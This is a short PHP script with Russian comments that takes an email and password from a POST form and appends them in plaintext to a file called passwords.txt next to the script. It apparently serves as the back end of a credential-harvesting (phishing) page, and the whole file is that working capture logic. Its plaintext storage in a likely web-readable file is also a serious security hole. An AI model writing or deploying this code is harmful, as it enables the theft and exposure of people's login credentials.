<?php
// Проверяем, что запрос пришел методом POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Получаем данные из формы
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Проверяем, что данные не пустые
    if (!empty($email) && !empty($password)) {
        // Формируем строку для записи
        $data = "Email: $email, Password: $password\n";
        
        // Путь к файлу (в той же директории, что и скрипт)
        $file = 'passwords.txt';
        
        // Пытаемся записать в файл
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) !== false) {
            echo "Данные успешно сохранены";
        } else {
            echo "Ошибка при записи в файл";
        }
    } else {
        echo "Не все данные получены";
    }
} else {
    echo "Неверный метод запроса";
}
?>